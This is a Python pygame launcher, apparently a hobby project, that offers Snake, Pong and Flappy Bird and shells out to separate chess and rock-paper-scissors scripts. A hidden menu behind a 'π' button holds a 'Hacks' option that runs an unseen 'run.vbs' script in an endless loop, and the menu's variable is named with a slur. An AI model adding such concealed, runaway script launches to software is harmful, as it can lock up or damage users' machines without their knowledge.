import os
import pygame
import pygame as pg
import time
import random
import webbrowser
from pygame.locals import *
import pygame_menu
import random
import sys
import math

pygame.init()
surface = pygame.display.set_mode((800, 600))



def start_the_game1():                                    ####################
    # Do game here !
    print("hi")
    pygame.init()


    display_width,display_height = 800,600

    black = (0,0,0)
    white = (255,255,255)
    cyan = (0,255,255)
    yellow = (255,255,0)
    red = (255,0,0)
    green = (0,255,0)
    blue = (0,0,255)
    pink = (255,182,194)
    violet = (60,0,93)
    bright_red = (255,0,0)
    bright_green = (0,255,0)

    '''global bgcol
    global bkcol
    global ab
    global aa
    global spd
    global scrr
    global eatimg'''

    eatimg = pygame.image.load('appl.png')

    ab = 'bb.wav'

    introm = 'introm.mp3'

    aa = pygame.mixer.Sound("cc.wav")

    global xs
    global ys
    global mvmt
    global applepos
    global img
    global appleimage
    global font
    global score
    global clk
    global clkk

    clk = 0

    clkk = 0


    hh = 0

    scrr = 6

    spd = 24

    bkcol = yellow

    bgcol = violet

    global clickk

    clickk = pygame.mixer.Sound("tick.wav")



    gameDisplay = pygame.display.set_mode((display_width,display_height), HWSURFACE | DOUBLEBUF)
    pygame.display.set_caption('The SNAKE GAME (version - 1.0.0)')
    clock = pygame.time.Clock()

    gameIcon = pygame.image.load('ic.png')

    intbg = pygame.image.load('snkbg.jpeg')
    intbg = pygame.transform.scale(intbg, (800,600))
    pygame.display.flip()

    stnbg = pygame.image.load('settbg.png')
    stnbg = pygame.transform.scale(stnbg, (800,600))
    pygame.display.flip()

    pygame.display.set_icon(gameIcon)

    recta = intbg.get_rect()

    recta = recta.move((0,0))

    setta = stnbg.get_rect()

    setta = recta.move((0,0))

    istcbg = pygame.image.load('nxtimg.jpg')
    istcbg = pygame.transform.scale(istcbg, (800,600))
    pygame.display.flip()


    rectis = istcbg.get_rect()

    rectis = rectis.move((0,0))
    gameDisplay.blit(istcbg, rectis)


    def intromusic():
        pygame.mixer.music.load(introm)
        pygame.mixer.music.play(-1)
        game_intro()

    def round_rect(surface, rect, color, rad=28, border=0, inside=(0,0,0,0)):

        rect = pg.Rect(rect)
        zeroed_rect = rect.copy()
        zeroed_rect.topleft = 0,0
        image = pg.Surface(rect.size).convert_alpha()
        image.fill((0,0,0,0))
        _render_region(image, zeroed_rect, color, rad)
        if border:
            zeroed_rect.inflate_ip(-2*border, -2*border)
            _render_region(image, zeroed_rect, inside, rad)
        surface.blit(image, rect)


    def _render_region(image, rect, color, rad):
      
        corners = rect.inflate(-2*rad, -2*rad)
        for attribute in ("topleft", "topright", "bottomleft", "bottomright"):
            pg.draw.circle(image, color, getattr(corners,attribute), rad)
        image.fill(color, rect.inflate(-2*rad,0))
        image.fill(color, rect.inflate(0,-2*rad))






    def button(msg,x,y,w,h,ic,ac,r,action):
        mouse = pygame.mouse.get_pos()
        click = pygame.mouse.get_pressed()
        
        if x+w > mouse[0] > x and y+h > mouse[1] > y:
            round_rect(gameDisplay, (x-r,y-r,w+(2*r),h+(2*r)), ac)
            if click[0] == 1 and action != None:
                action()         
        else:
            round_rect(gameDisplay, (x-2,y-2,w+4,h+4), ic)
        smallText = pygame.font.SysFont("calibri",30)
        textSurf, textRect = text_objects(msg, smallText)
        textRect.center = ( (x+(w/2)), (y+(h/2)) )
        gameDisplay.blit(textSurf, textRect)
        



    def blocks(blockx, blocky, blockw, blockh, color):
        pygame.draw.rect(gameDisplay, color, [blockx, blocky, blockw, blockh])


    def misc():
        global ab
        global aa
        global introm
        ab = 'bb.wav'
        aa = pygame.mixer.Sound("cc.wav")
        introm = 'introm.mp3'
        pygame.mixer.music.unpause()
        pygame.display.update()
        clock.tick(15)

    def musc():
        global ab
        global aa
        global introm
        ab = 'sil.wav'
        aa = pygame.mixer.Sound("sil.wav")
        introm = 'sil.wav'
        pygame.mixer.music.pause()
        pygame.display.update()
        clock.tick(15)

    def bcgcolgn():
        global bgcol
        bgcol = bright_green
        pygame.display.update()
        clock.tick(15)

    def bcgcolvl():
        global bgcol
        bgcol = violet
        pygame.display.update()
        clock.tick(15)


    def bcgcolpn():
        global bgcol
        bgcol = pink
        pygame.display.update()
        clock.tick(15)



    def blkcolyl():
        global bkcol
        bkcol = yellow
        pygame.display.update()
        clock.tick(15)

    def blkcolbl():
        global bkcol
        bkcol = black
        pygame.display.update()
        clock.tick(15)

    def blkcolrd():
        global bkcol
        bkcol = bright_red
        pygame.display.update()
        clock.tick(15)


    def spde():
        global spd
        global scrr
        global eatimg
        spd = 20
        scrr = 4
        eatimg = pygame.image.load('mngimg.png')
        pygame.display.update()
        clock.tick(15)


    def spdm():
        global spd
        global scrr
        global eatimg
        spd = 24
        scrr = 6
        eatimg = pygame.image.load('appl.png')
        pygame.display.update()
        clock.tick(15)


    def spdh():
        global spd
        global scrr
        global eatimg
        spd = 32
        scrr = 8
        eatimg = pygame.image.load('mngimg.png')
        pygame.display.update()
        clock.tick(15)



    def text_objects(text, font):
        textSurface = font.render(text, True, black)     ###
        return textSurface, textSurface.get_rect()

    def scores(count):
        font = pygame.font.SysFont("copperplate gothic", 25)
        name = pygame.font.SysFont("Segoe UI", 25)
        text = font.render("Your Score: "+str(count), True, black)
        hs = font.render("High Score: "+str(hh), True, black)
        gameDisplay.blit(text,(10,10))
        gameDisplay.blit(hs,(14,35))


    def quitgame():
        pygame.quit()
        quit()


    def eat(x1, x2, y1, y2, w1, w2, h1, h2):
        if x1+w1>x2 and x1<x2+w2 and y1+h1>y2 and y1<y2+h2:
            return True
        else:
            return False


    def crash():

        pygame.mixer.music.stop()
        pygame.mixer.Sound.play(aa)
        largeText = pygame.font.SysFont("chiller",155)
        TextSurf, TextRect = text_objects("GAME OVER", largeText)
        TextRect.center = ((display_width/2),(display_height/2.5))
        gameDisplay.blit(TextSurf, TextRect)
        
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    quit()
                
        

            button("Try Again",120,400,120,50,green,bright_green,9,countdown)
            button("Main Menu",350,400,150,50,(112,128,144),(192,192,192),9,intromusic)
            button("Exit",600,400,100,50,red,bright_red,9,quitgame)

            pygame.display.update()
            clock.tick(15) 
            
    def game_intro():

        intro = True

        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    quit()

            gameDisplay.blit(intbg, recta)
            largeText = pygame.font.SysFont("broadway",75)
            smallText = pygame.font.SysFont("forte",68)
            name = pygame.font.SysFont("Segoe UI", 25)
            TextSurf, TextRect = text_objects("The", smallText)
            TextSurf1, TextRect1 = text_objects("SNAKE", largeText)
            TextSurf2, TextRect2 = text_objects("GAME", largeText)
            TextRect.center = (118,464)
            TextRect1.center = (329,460)
            TextRect2.center = (610,460)
            gameDisplay.blit(TextSurf, TextRect)
            gameDisplay.blit(TextSurf1, TextRect1)
            gameDisplay.blit(TextSurf2, TextRect2)



            button("Play",608,100,149,50,green,bright_green,9,countdown)
            button("Instructions",608,177,149,50,red,bright_red,9,instrc)
            button("Settings",608,257,149,50,(112,128,144),(192,192,192),9,sett)
            button("Exit",608,337,149,50,yellow,yellow,9,quitgame)
            

            pygame.display.update()
            clock.tick(15)

    def sett():

        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    quit()
        
            gameDisplay.blit(stnbg, setta)
            
            bgdcol = pygame.font.SysFont("Segoe UI",40)
            blkcol = pygame.font.SysFont("Segoe UI",40)
            gmms = pygame.font.SysFont("Segoe UI",40)
            sppd = pygame.font.SysFont("Segoe UI",40)
            TextSurf3, TextRect3 = text_objects("Choose Background Colour", bgdcol)
            TextSurf4, TextRect4 = text_objects("Choose Snake Colour", blkcol)
            TextSurf5, TextRect5 = text_objects("Choose Difficulty", sppd)
            TextSurf6, TextRect6 = text_objects("Game Music",gmms)
            TextRect3.center = (257,90)
            TextRect4.center = (203,210)
            TextRect5.center = (170,330)
            TextRect6.center = (132,440)
            gameDisplay.blit(TextSurf3, TextRect3)
            gameDisplay.blit(TextSurf4, TextRect4)
            gameDisplay.blit(TextSurf5, TextRect5)
            gameDisplay.blit(TextSurf6, TextRect6)
            button("<- RETURN",302,540,150,50,(153,217,234),(163,227,244),9,game_intro)
            
            button("Green",100,120,100,50,green,bright_green,6,bcgcolgn)
            button("Violet",275,120,100,50,(167,0,237),(189,33,255),6,bcgcolvl)
            button("Pink",450,120,100,50,(255,116,140),(255,141,161),6,bcgcolpn)
            
            button("Yellow",100,240,100,50,yellow,(255,255,100),6,blkcolyl)
            button("Black",275,240,100,50,(169,169,169),(207,207,207),6,blkcolbl)
            button("Red",450,240,100,50,red,bright_red,6,blkcolrd)

            button("Easy",100,360,100,50,green,bright_green,6,spde)
            button("Medium",275,360,100,50,yellow,(255,255,100),6,spdm)
            button("Hard",450,360,100,50,red,bright_red,6,spdh)
            
            button("On",100,470,100,50,green,bright_green,6,misc)
            button("Off",275,470,100,50,red,bright_red,6,musc)
            
            pygame.display.update()
            clock.tick(15)



        

    def instrc():
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    quit()

            gameDisplay.blit(istcbg, rectis)

            button("<- RETURN",248,500,135,44,(153,217,234),(163,227,244),9,game_intro)
        
            pygame.display.update()
            clock.tick(15)

    def unpause():

        pygame.mixer.music.unpause()
        global pause
        pause = False

    def paused():
        
        pygame.mixer.music.pause()
        largeText = pygame.font.SysFont("calculator",135)
        TextSurf, TextRect = text_objects("PAUSED", largeText)
        TextRect.center = ((display_width/2),(display_height/2))
        gameDisplay.blit(TextSurf, TextRect)
        

        while pause:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    quit()

                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_p:
                        unpause()
                    
                

           
            button("Resume",150,450,100,50,green,bright_green,8.6,unpause)
            button("Exit",550,450,100,50,red,bright_red,8.6,quitgame)


            pygame.display.update()
            clock.tick(15)


    def delay():
        t0 = time.time()
        dur = 1.0
        while True:
            time.sleep(dur)
            t1 = time.time()
            dur = 1.0 - (t1 - t0)
            if dur <= 0:
                break


    def countdown():
        pygame.mixer.music.load(ab)
        pygame.mixer.music.play(-1)
        w = ["3","2","1"]
        place = [300,400,500]
        gameDisplay.fill(bgcol)
        for i in range(len(w)):
            largeText = pygame.font.SysFont("calculator",135)
            TextSurf, TextRect = text_objects(w[i], largeText)
            TextRect.center = (place[i],(display_height/2))
            gameDisplay.blit(TextSurf, TextRect)
        
            


            time.sleep(1)
            pygame.display.update()
            clock.tick(15)
        time.sleep(1)     
        game_play()


    def game_play():
        global hh

        xs = [290, 290, 290, 290, 290]
        ys = [176, 155, 135, 115, 95]

        mvmt = 0

        score = 0

        global pause

       
        
        img = pygame.Surface((20, 20))
        img.fill(bkcol)

        appleimage = eatimg
        

        applepos = (random.randint(0, 590), random.randint(0, 590))

        bldm = 20
        blhx = display_width/2
        blhy = display_height/2

        gameExit = False
        while not gameExit:
        
            for e in pygame.event.get():
                if e.type == pygame.QUIT:
                    pygame.quit()
                    quit()

                
                elif e.type == KEYDOWN:
                    if e.key == K_UP and mvmt != 0:
                        mvmt = 2
                    elif e.key == K_DOWN and mvmt != 2:
                        mvmt = 0
                    elif e.key == K_LEFT and mvmt != 1:
                        mvmt = 3
                    elif e.key == K_RIGHT and mvmt != 3:
                        mvmt = 1
                    if e.key == pygame.K_p:
                        pause = True
                        paused()
            
            i = len(xs)-1
            
            while i >= 2:
                if eat(xs[0], xs[i], ys[0], ys[i], 20, 20, 20, 20):
                    crash()
                i -= 1
                
            if eat(xs[0], applepos[0], ys[0], applepos[1], 25, 25, 20, 20):
                score += scrr
                xs.append(0)
                ys.append(0)
                applepos=(random.randint(0,770),random.randint(0,563))

                
            if xs[0] < 0 or xs[0] > 786 or ys[0] < 0 or ys[0] > 572:
                crash()
                
                
            i = len(xs)-1


            
            while i >= 1:
                xs[i] = xs[i-1]
                ys[i] = ys[i-1]
                i -= 1
            if mvmt==0:
                ys[0] += spd
            elif mvmt==1:
                xs[0] += spd
            elif mvmt==2:
                ys[0] -= spd
            elif mvmt==3:
                xs[0] -= spd
                

            
            gameDisplay.fill(bgcol)
            hh = 0

            if score > hh:
                hh = score
            scores(score)

            
     




            for i in range(0, len(xs)):
                gameDisplay.blit(img, (xs[i], ys[i]))

            gameDisplay.blit(appleimage, applepos)
             
            pygame.display.update()
            clock.tick(15)


            
    intromusic()
    pass


def start_the_game2():                                      ####################
    # Do game here !
    pygame.init()


    WIDTH, HEIGHT = 800, 600
    WIN = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Pong")

    FPS = 60

    WHITE = (255, 255, 255)
    BLACK = (0, 0, 0)

    PADDLE_WIDTH, PADDLE_HEIGHT = 20, 100
    BALL_RADIUS = 7

    SCORE_FONT = pygame.font.SysFont("comicsans", 50)
    WINNING_SCORE = 10


    class Paddle:
        COLOR = WHITE
        VEL = 4

        def __init__(self, x, y, width, height):
            self.x = self.original_x = x
            self.y = self.original_y = y
            self.width = width
            self.height = height

        def draw(self, win):
            pygame.draw.rect(
                win, self.COLOR, (self.x, self.y, self.width, self.height))

        def move(self, up=True):
            if up:
                self.y -= self.VEL
            else:
                self.y += self.VEL

        def reset(self):
            self.x = self.original_x
            self.y = self.original_y


    class Ball:
        MAX_VEL = 5
        COLOR = WHITE

        def __init__(self, x, y, radius):
            self.x = self.original_x = x
            self.y = self.original_y = y
            self.radius = radius
            self.x_vel = self.MAX_VEL
            self.y_vel = 0

        def draw(self, win):
            pygame.draw.circle(win, self.COLOR, (self.x, self.y), self.radius)

        def move(self):
            self.x += self.x_vel
            self.y += self.y_vel

        def reset(self):
            self.x = self.original_x
            self.y = self.original_y
            self.y_vel = 0
            self.x_vel *= -1


    def draw(win, paddles, ball, left_score, right_score):
        win.fill(BLACK)

        left_score_text = SCORE_FONT.render(f"{left_score}", 1, WHITE)
        right_score_text = SCORE_FONT.render(f"{right_score}", 1, WHITE)
        win.blit(left_score_text, (WIDTH//4 - left_score_text.get_width()//2, 20))
        win.blit(right_score_text, (WIDTH * (3/4) -
                                    right_score_text.get_width()//2, 20))

        for paddle in paddles:
            paddle.draw(win)

        for i in range(10, HEIGHT, HEIGHT//20):
            if i % 2 == 1:
                continue
            pygame.draw.rect(win, WHITE, (WIDTH//2 - 5, i, 10, HEIGHT//20))

        ball.draw(win)
        pygame.display.update()


    def handle_collision(ball, left_paddle, right_paddle):
        if ball.y + ball.radius >= HEIGHT:
            ball.y_vel *= -1
        elif ball.y - ball.radius <= 0:
            ball.y_vel *= -1

        if ball.x_vel < 0:
            if ball.y >= left_paddle.y and ball.y <= left_paddle.y + left_paddle.height:
                if ball.x - ball.radius <= left_paddle.x + left_paddle.width:
                    ball.x_vel *= -1

                    middle_y = left_paddle.y + left_paddle.height / 2
                    difference_in_y = middle_y - ball.y
                    reduction_factor = (left_paddle.height / 2) / ball.MAX_VEL
                    y_vel = difference_in_y / reduction_factor
                    ball.y_vel = -1 * y_vel

        else:
            if ball.y >= right_paddle.y and ball.y <= right_paddle.y + right_paddle.height:
                if ball.x + ball.radius >= right_paddle.x:
                    ball.x_vel *= -1

                    middle_y = right_paddle.y + right_paddle.height / 2
                    difference_in_y = middle_y - ball.y
                    reduction_factor = (right_paddle.height / 2) / ball.MAX_VEL
                    y_vel = difference_in_y / reduction_factor
                    ball.y_vel = -1 * y_vel


    def handle_paddle_movement(keys, left_paddle, right_paddle):
        if keys[pygame.K_w] and left_paddle.y - left_paddle.VEL >= 0:
            left_paddle.move(up=True)
        if keys[pygame.K_s] and left_paddle.y + left_paddle.VEL + left_paddle.height <= HEIGHT:
            left_paddle.move(up=False)

        if keys[pygame.K_UP] and right_paddle.y - right_paddle.VEL >= 0:
            right_paddle.move(up=True)
        if keys[pygame.K_DOWN] and right_paddle.y + right_paddle.VEL + right_paddle.height <= HEIGHT:
            right_paddle.move(up=False)


    def main():
        run = True
        clock = pygame.time.Clock()

        left_paddle = Paddle(10, HEIGHT//2 - PADDLE_HEIGHT //
                             2, PADDLE_WIDTH, PADDLE_HEIGHT)
        right_paddle = Paddle(WIDTH - 10 - PADDLE_WIDTH, HEIGHT //
                              2 - PADDLE_HEIGHT//2, PADDLE_WIDTH, PADDLE_HEIGHT)
        ball = Ball(WIDTH // 2, HEIGHT // 2, BALL_RADIUS)

        left_score = 0
        right_score = 0

        while run:
            clock.tick(FPS)
            draw(WIN, [left_paddle, right_paddle], ball, left_score, right_score)

            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    run = False
                    break

                if event.type == QUIT or (event.type==KEYDOWN and event.key == K_ESCAPE):    ####
                    pygame.quit()
                    sys.exit()             #####

            keys = pygame.key.get_pressed()
            handle_paddle_movement(keys, left_paddle, right_paddle)

            ball.move()
            handle_collision(ball, left_paddle, right_paddle)

            if ball.x < 0:
                right_score += 1
                ball.reset()
            elif ball.x > WIDTH:
                left_score += 1
                ball.reset()

            won = False
            if left_score >= WINNING_SCORE:
                won = True
                win_text = "Left Player Won!"
            elif right_score >= WINNING_SCORE:
                won = True
                win_text = "Right Player Won!"

            if won:
                text = SCORE_FONT.render(win_text, 1, WHITE)
                WIN.blit(text, (WIDTH//2 - text.get_width() //
                                2, HEIGHT//2 - text.get_height()//2))
                pygame.display.update()
                pygame.time.delay(5000)
                ball.reset()
                left_paddle.reset()
                right_paddle.reset()
                left_score = 0
                right_score = 0

        pygame.quit()


    if __name__ == '__main__':
        main()
    pass



def start_the_game3():                #######################
    # Do game here !
    FPS = 32
    SCREENWIDTH = 289
    SCREENHEIGHT = 511
    SCREEN = pygame.display.set_mode((SCREENWIDTH, SCREENHEIGHT))
    GROUNDY = SCREENHEIGHT * 0.8
    GAME_SPRITES = {}
    GAME_SOUNDS = {}
    PLAYER = 'gallery/sprites/bird.png'
    BACKGROUND = 'gallery/sprites/background.png'
    PIPE = 'gallery/sprites/pipe.png'

    def welcomeScreen():
        """
        Shows welcome images on the screen
        """

        playerx = int(SCREENWIDTH/5)
        playery = int((SCREENHEIGHT - GAME_SPRITES['player'].get_height())/2)
        messagex = int((SCREENWIDTH - GAME_SPRITES['message'].get_width())/2)
        messagey = int(SCREENHEIGHT*0.13)
        basex = 0
        while True:
            for event in pygame.event.get():
                # if user clicks on cross button, close the game
                if event.type == QUIT or (event.type==KEYDOWN and event.key == K_ESCAPE):
                    pygame.quit()
                    sys.exit()
                                       


                # If the user presses space or up key, start the game for them
                elif event.type==KEYDOWN and (event.key==K_SPACE or event.key == K_UP):
                    return
                else:
                    SCREEN.blit(GAME_SPRITES['background'], (0, 0))    
                    SCREEN.blit(GAME_SPRITES['player'], (playerx, playery))    
                    SCREEN.blit(GAME_SPRITES['message'], (messagex,messagey ))    
                    SCREEN.blit(GAME_SPRITES['base'], (basex, GROUNDY))    
                    pygame.display.update()
                    FPSCLOCK.tick(FPS)

    def mainGame():
        score = 0
        playerx = int(SCREENWIDTH/5)
        playery = int(SCREENWIDTH/2)
        basex = 0

        
        newPipe1 = getRandomPipe()
        newPipe2 = getRandomPipe()

        
        upperPipes = [
            {'x': SCREENWIDTH+200, 'y':newPipe1[0]['y']},
            {'x': SCREENWIDTH+200+(SCREENWIDTH/2), 'y':newPipe2[0]['y']},
        ]
        
        lowerPipes = [
            {'x': SCREENWIDTH+200, 'y':newPipe1[1]['y']},
            {'x': SCREENWIDTH+200+(SCREENWIDTH/2), 'y':newPipe2[1]['y']},
        ]

        pipeVelX = -4

        playerVelY = -9
        playerMaxVelY = 10
        playerMinVelY = -8
        playerAccY = 1

        playerFlapAccv = -8 
        playerFlapped = False


        while True:
            for event in pygame.event.get():
                if event.type == QUIT or (event.type == KEYDOWN and event.key == K_ESCAPE):
                    pygame.quit()
                    sys.exit()
                    #surface = pygame.display.set_mode((800, 600))
                    #menu.mainloop(surface)
                if event.type == KEYDOWN and (event.key == K_SPACE or event.key == K_UP):
                    if playery > 0:
                        playerVelY = playerFlapAccv
                        playerFlapped = True
                        GAME_SOUNDS['wing'].play()


            crashTest = isCollide(playerx, playery, upperPipes, lowerPipes) 
            if crashTest:             
                return     

            #check for score
            playerMidPos = playerx + GAME_SPRITES['player'].get_width()/2
            for pipe in upperPipes:
                pipeMidPos = pipe['x'] + GAME_SPRITES['pipe'][0].get_width()/2
                if pipeMidPos<= playerMidPos < pipeMidPos +4:
                    score +=1
                    print(f"Your score is {score}") 
                    GAME_SOUNDS['point'].play()


            if playerVelY <playerMaxVelY and not playerFlapped:
                playerVelY += playerAccY

            if playerFlapped:
                playerFlapped = False            
            playerHeight = GAME_SPRITES['player'].get_height()
            playery = playery + min(playerVelY, GROUNDY - playery - playerHeight)

            
            for upperPipe , lowerPipe in zip(upperPipes, lowerPipes):
                upperPipe['x'] += pipeVelX
                lowerPipe['x'] += pipeVelX

            
            if 0<upperPipes[0]['x']<5:
                newpipe = getRandomPipe()
                upperPipes.append(newpipe[0])
                lowerPipes.append(newpipe[1])

            
            if upperPipes[0]['x'] < -GAME_SPRITES['pipe'][0].get_width():
                upperPipes.pop(0)
                lowerPipes.pop(0)
            
            
            SCREEN.blit(GAME_SPRITES['background'], (0, 0))
            for upperPipe, lowerPipe in zip(upperPipes, lowerPipes):
                SCREEN.blit(GAME_SPRITES['pipe'][0], (upperPipe['x'], upperPipe['y']))
                SCREEN.blit(GAME_SPRITES['pipe'][1], (lowerPipe['x'], lowerPipe['y']))

            SCREEN.blit(GAME_SPRITES['base'], (basex, GROUNDY))
            SCREEN.blit(GAME_SPRITES['player'], (playerx, playery))
            myDigits = [int(x) for x in list(str(score))]
            width = 0
            for digit in myDigits:
                width += GAME_SPRITES['numbers'][digit].get_width()
            Xoffset = (SCREENWIDTH - width)/2

            for digit in myDigits:
                SCREEN.blit(GAME_SPRITES['numbers'][digit], (Xoffset, SCREENHEIGHT*0.12))
                Xoffset += GAME_SPRITES['numbers'][digit].get_width()
            pygame.display.update()
            FPSCLOCK.tick(FPS)

    def isCollide(playerx, playery, upperPipes, lowerPipes):
        if playery> GROUNDY - 25  or playery<0:       
            GAME_SOUNDS['hit'].play()
            return True
        
        for pipe in upperPipes:
            pipeHeight = GAME_SPRITES['pipe'][0].get_height()
            if(playery < pipeHeight + pipe['y'] and abs(playerx - pipe['x']) < GAME_SPRITES['pipe'][0].get_width()):
                GAME_SOUNDS['hit'].play()
                return True

        for pipe in lowerPipes:
            if (playery + GAME_SPRITES['player'].get_height() > pipe['y']) and abs(playerx - pipe['x']) < GAME_SPRITES['pipe'][0].get_width():
                GAME_SOUNDS['hit'].play()
                return True

        return False

    def getRandomPipe():
        """
        Generate positions of two pipes(one bottom straight and one top rotated ) for blitting on the screen
        """
        pipeHeight = GAME_SPRITES['pipe'][0].get_height()
        offset = SCREENHEIGHT/3
        y2 = offset + random.randrange(0, int(SCREENHEIGHT - GAME_SPRITES['base'].get_height()  - 1.2 *offset))
        pipeX = SCREENWIDTH + 10
        y1 = pipeHeight - y2 + offset
        pipe = [
            {'x': pipeX, 'y': -y1},
            {'x': pipeX, 'y': y2} 
        ]
        return pipe






    if __name__ == "__main__":
        
        pygame.init() 
        FPSCLOCK = pygame.time.Clock()
        pygame.display.set_caption('Flappy Bird')
        GAME_SPRITES['numbers'] = ( 
            pygame.image.load('gallery/sprites/0.png').convert_alpha(),
            pygame.image.load('gallery/sprites/1.png').convert_alpha(),
            pygame.image.load('gallery/sprites/2.png').convert_alpha(),
            pygame.image.load('gallery/sprites/3.png').convert_alpha(),
            pygame.image.load('gallery/sprites/4.png').convert_alpha(),
            pygame.image.load('gallery/sprites/5.png').convert_alpha(),
            pygame.image.load('gallery/sprites/6.png').convert_alpha(),
            pygame.image.load('gallery/sprites/7.png').convert_alpha(),
            pygame.image.load('gallery/sprites/8.png').convert_alpha(),
            pygame.image.load('gallery/sprites/9.png').convert_alpha(),
        )

        GAME_SPRITES['message'] =pygame.image.load('gallery/sprites/message.png').convert_alpha()
        GAME_SPRITES['base'] =pygame.image.load('gallery/sprites/base.png').convert_alpha()
        GAME_SPRITES['pipe'] =(pygame.transform.rotate(pygame.image.load( PIPE).convert_alpha(), 180), 
        pygame.image.load(PIPE).convert_alpha()
        )

        # Game sounds
        GAME_SOUNDS['die'] = pygame.mixer.Sound('gallery/audio/die.wav')
        GAME_SOUNDS['hit'] = pygame.mixer.Sound('gallery/audio/hit.wav')
        GAME_SOUNDS['point'] = pygame.mixer.Sound('gallery/audio/point.wav')
        GAME_SOUNDS['swoosh'] = pygame.mixer.Sound('gallery/audio/swoosh.wav')
        GAME_SOUNDS['wing'] = pygame.mixer.Sound('gallery/audio/wing.wav')

        GAME_SPRITES['background'] = pygame.image.load(BACKGROUND).convert()
        GAME_SPRITES['player'] = pygame.image.load(PLAYER).convert_alpha()

        while True:
            welcomeScreen()
            mainGame()
            


    pass

   


def RPS_online():
    os.system('RPS\client.py')

def Chess_launch():
    os.system('chess\game.py')



def back():
    pygame_menu.events.EXIT
    offline_menu()


def hack():
    looper = 1
    while looper > 0:
        os.system('run.vbs')
    


def secret():
    pygame_menu.events.EXIT
    gay = pygame_menu.Menu('Welcome to my secret', 800, 600,
                       theme=pygame_menu.themes.THEME_DARK)
    gay.add.button('Hacks',hack)
    gay.add.button('back', back)
    gay.mainloop(surface)
    


######## Themes 
welcometheme = pygame_menu.themes.THEME_DEFAULT.copy()
welcometheme.title_background_color=(0, 0, 125) ## R, G, B

welcometheme2 = pygame_menu.themes.THEME_DEFAULT.copy()
welcometheme2.title_background_color=(125, 0, 0) ## R, G, B

snaketheme = pygame_menu.themes.THEME_GREEN.copy()
snaketheme.title_background_color=(0, 125, 0) ## R, G, B

pongtheme = pygame_menu.themes.THEME_DARK.copy()
pongtheme.title_background_color=(0, 0, 0) ## R, G, B

flappytheme = pygame_menu.themes.THEME_ORANGE.copy()
flappytheme.title_background_color=(100, 50, 25) ## R, G, B
########


def RPS_menu():               ######
    menu = pygame_menu.Menu('R, P, S', 800, 600,
                           theme=welcometheme2)
    
    menu.add.button('Join',RPS_online)
    menu.add.button('Quit', startup)
    menu.mainloop(surface)

def Chess_menu():
    menu = pygame_menu.Menu('Chess', 800, 600,
                           theme=welcometheme2)
    
    menu.add.button('Join',Chess_launch)
    menu.add.button('Quit', startup)
    menu.mainloop(surface)

def startupgame1():
    menu = pygame_menu.Menu('Snake',800, 600,
                       theme=snaketheme)
    menu.add.button('Play', start_the_game1)
    menu.add.button('Back', back)
    menu.mainloop(surface)

def startupgame2():
    menu = pygame_menu.Menu('Pong', 800, 600,
                       theme=pongtheme)
    menu.add.button('Play', start_the_game2)
    menu.add.button('Back', back)
    menu.mainloop(surface)

def startupgame3():
    menu = pygame_menu.Menu('Flappy bird', 800, 600,
                       theme=flappytheme)
    menu.add.button('Play', start_the_game3)
    menu.add.button('Back', back)
    menu.mainloop(surface)


def offline_menu():
    pygame_menu.events.EXIT
    menu = pygame_menu.Menu('Welcome', 800, 600,
                           theme=welcometheme)


   
    menu.add.button('Snake',startupgame1)
    menu.add.button('Pong',startupgame2)
    menu.add.button('Flappy bird',startupgame3)
    menu.add.button('Quit', startup)
    menu.add.button('π',secret)
    menu.mainloop(surface)

def online_menu():               # currently a place holder
    pygame_menu.events.EXIT
    menu = pygame_menu.Menu('Welcome', 800, 600,
                           theme=welcometheme2)


    
    menu.add.button('Rock, Paper, Scissors',RPS_menu)
    menu.add.button('Chess',Chess_menu)
    menu.add.button('Quit', startup)
    menu.add.button('π',secret)
    menu.mainloop(surface)



def startup():
    pygame_menu.events.EXIT

    startup = pygame_menu.Menu('', 800, 600,
                               theme=pygame_menu.themes.THEME_DEFAULT)
    startup.add.button('Online',online_menu)
    startup.add.button('Offline',offline_menu)
    startup.mainloop(surface)

startup()

